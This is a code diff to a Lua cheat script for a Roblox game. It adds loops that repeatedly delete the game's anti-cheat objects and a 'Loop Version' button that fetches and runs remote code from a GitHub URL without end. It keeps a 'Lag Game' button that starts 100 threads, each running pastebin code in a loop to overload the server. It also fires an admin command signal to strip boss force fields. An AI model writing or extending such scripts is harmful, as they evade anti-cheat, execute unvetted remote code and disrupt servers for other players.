@@ -1,3 +1,6 @@
+-- ============================
+-- ANTI-CHEAT REMOVAL (RUNS FIRST)
+-- ============================
 pcall(function()
     local ps = game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts")
     local k = ps:FindFirstChild("Kmdj")
@@ -10,6 +13,30 @@ pcall(function()
     if ac then ac:Destroy() end
 end)
 
+-- Anti-cheat removal loop (continuous)
+task.spawn(function()
+    while true do
+        pcall(function()
+            local ps = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerScripts")
+            if ps then
+                local k = ps:FindFirstChild("Kmdj")
+                if k then k:Destroy() end
+            end
+        end)
+        pcall(function()
+            local pg = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
+            if pg then
+                local ac = pg:FindFirstChild("anticheat")
+                if ac then ac:Destroy() end
+            end
+        end)
+        task.wait(1)
+    end
+end)
+
+-- ============================
+-- MAIN SCRIPT
+-- ============================
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -2109,6 +2136,9 @@ makeToggle(combat, "Auto Attack (Loop)", false, 4, function(enabled)
     end
 end)
 
+-- ============================
+-- BURST ATTACK SECTION
+-- ============================
 makeSection(combat, "Burst Attack", 5)
 makeButton(combat, "Attack All (Infinite)", "This can stack but if too much may cause lag", 6, function()
     if not guiAlive then return end
@@ -2192,9 +2222,10 @@ makeToggle(combat, "Auto Poison Loop", false, 9, function(enabled)
 end)
 
 -- ============================
--- SCRIPTS (TEST)
+-- BETTER THAN ATTACK ALL (with Loop Version)
 -- ============================
-makeSection(combat, "Better Than Atack All", 10)
+makeSection(combat, "Better Than Attack All", 10)
+
 makeButton(combat, "Boss Clapper 4000", "This Script Fuck Every Single Boss", 11, function()
     if not guiAlive then return end
     createNotification("IDK WHAT TO PUT HERE :OOOO", "This boss Is Going To Be Clap Hard ", 2, C.cyan)
@@ -2203,11 +2234,63 @@ makeButton(combat, "Boss Clapper 4000", "This Script Fuck Every Single Boss", 11
     end)
 end)
 
+-- Loop Version warning note
+local loopWarningNote = Instance.new("Frame")
+loopWarningNote.Size = UDim2.new(1, 0, 0, isMobile and 50 or 42)
+loopWarningNote.BackgroundColor3 = C.card
+loopWarningNote.BorderSizePixel = 0
+loopWarningNote.ZIndex = 9
+loopWarningNote.LayoutOrder = 12
+loopWarningNote.Parent = combat
+corner(loopWarningNote, isMobile and 10 or 8)
+
+local loopWarningBar = Instance.new("Frame")
+loopWarningBar.Size = UDim2.new(0, isMobile and 4 or 3, 0.6, 0)
+loopWarningBar.Position = UDim2.new(0, isMobile and 10 or 8, 0.2, 0)
+loopWarningBar.BackgroundColor3 = C.red
+loopWarningBar.BorderSizePixel = 0
+loopWarningBar.ZIndex = 10
+loopWarningBar.Parent = loopWarningNote
+corner(loopWarningBar, 2)
+
+local loopWarningText = Instance.new("TextLabel")
+loopWarningText.Size = UDim2.new(1, -28, 1, 0)
+loopWarningText.Position = UDim2.new(0, isMobile and 20 or 18, 0, 0)
+loopWarningText.BackgroundTransparency = 1
+loopWarningText.Text = "⚠ This lags you so much. If you got a good PC or phone it's ok!"
+loopWarningText.TextColor3 = C.red
+loopWarningText.TextSize = isMobile and 11 or 10
+loopWarningText.Font = Enum.Font.GothamSemibold
+loopWarningText.TextXAlignment = Enum.TextXAlignment.Left
+loopWarningText.TextWrapped = true
+loopWarningText.ZIndex = 10
+loopWarningText.Parent = loopWarningNote
+
+local loopVersionActive = false
+
+makeButton(combat, "Loop Version", "Runs Boss Clapper 4000 in infinite loop", 13, function()
+    if not guiAlive then return end
+    if loopVersionActive then
+        createNotification("Loop Version", "Loop is already running!", 2, C.yellow)
+        return
+    end
+    loopVersionActive = true
+    createNotification("⚠ Loop Version", "Starting infinite loop... This WILL lag!", 4, C.red)
+    task.spawn(function()
+        while loopVersionActive and guiAlive do
+            pcall(function()
+                loadstring(game:HttpGet('https://raw.githubusercontent.com/Mrpekob/test-1/refs/heads/main/for%20got%20demon'))()
+            end)
+            wait()
+        end
+    end)
+end)
+
 -- ============================
--- UNFF (MOVED TO COMBAT BELOW TEST)
+-- BOSS UTILITY (UNFF)
 -- ============================
-makeSection(combat, "Boss Utility", 12)
-makeButton(combat, "Unff Boss (This Spawn Tool In Your Iventory)", "Removes force field (Executes 6x)", 13, function()
+makeSection(combat, "Boss Utility", 14)
+makeButton(combat, "Unff Boss (This Spawn Tool In Your Iventory)", "Removes force field (Executes 6x)", 15, function()
     if not guiAlive then return end
     local signal = game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand")
     local args = {";unff"}
@@ -2222,7 +2305,7 @@ end)
 -- ============================
 -- CONTROLS (STOP ALL)
 -- ============================
-makeSection(combat, "Controls", 14)
+makeSection(combat, "Controls", 16)
 local stopBtn = Instance.new("TextButton")
 stopBtn.Size = UDim2.new(1, 0, 0, isMobile and 48 or 40)
 stopBtn.BackgroundColor3 = C.red
@@ -2230,7 +2313,7 @@ stopBtn.BorderSizePixel = 0
 stopBtn.Text = ""
 stopBtn.AutoButtonColor = false
 stopBtn.ZIndex = 9
-stopBtn.LayoutOrder = 15
+stopBtn.LayoutOrder = 17
 stopBtn.Parent = combat
 corner(stopBtn, isMobile and 10 or 8)
 
@@ -2253,6 +2336,7 @@ stopBtn.MouseButton1Click:Connect(function()
     if not guiAlive then return end
     stopEverything()
     poisonLoopActive = false
+    loopVersionActive = false
     tw(stopBtn, 0.1, {BackgroundColor3 = C.green}, Enum.EasingStyle.Linear)
     stopLabel.Text = "STOPPED"
     createNotification("Stop", "All attacks and loops stopped", 2, C.green)
@@ -2459,7 +2543,7 @@ local function applyFakeName()
     tw(nameApplyBtn, 0.1, {BackgroundColor3 = C.green}, Enum.EasingStyle.Linear)
     nameApplyBtn.Text = "✓"
     updateHomePlayerCard()
-    if nameHiderEnabled then refreshAllCensoredText() end
+    if nameHiderEnabled then restoreAllTexts() end
     task.wait(0.8)
     if not guiAlive then return end
     tw(nameApplyBtn, 0.2, {BackgroundColor3 = C.purple})
@@ -2505,6 +2589,7 @@ makeButton(misc, "Reset All Settings", "Restore default values", 13, function()
         end
     end)
     stopEverything()
+    loopVersionActive = false
     if instantProximityEnabled then 
         instantProximityEnabled = false 
         disableInstantProximity() 
@@ -2520,14 +2605,12 @@ makeButton(misc, "Lag Game", "Infinite loop lag script - USE AT YOUR OWN RISK", 
     if not guiAlive then return end
     createNotification("💀 Lag Game", "RIP server... loading lag script", 3, C.red)
     task.spawn(function()
-        -- Fire multiple parallel loops to maximize lag
         for thread = 1, 100 do
             task.spawn(function()
                 while true do
                     pcall(function()
                         loadstring(game:HttpGet('https://pastebin.com/raw/TC3a5hfE'))()
                     end)
-                    -- No wait = maximum aggression
                 end
             end)
         end
@@ -2537,6 +2620,7 @@ end)
 local function destroyGui()
     guiAlive = false
     stopEverything()
+    loopVersionActive = false
     playerSettings.walkSpeedEnabled = false
     if speedConnection then speedConnection:Disconnect() end
     disableInstantProximity()
@@ -2606,6 +2690,7 @@ end)
 CloseBtn.MouseButton1Click:Connect(function()
     if not guiAlive then return end
     guiAlive = false
+    loopVersionActive = false
     stopEverything()
     tw(Main, 0.4, {Size = UDim2.new(0, MAIN_W * 0.9, 0, MAIN_H * 0.9), BackgroundTransparency = 1}, Enum.EasingStyle.Back, Enum.EasingDirection.In)
     task.wait(0.5)
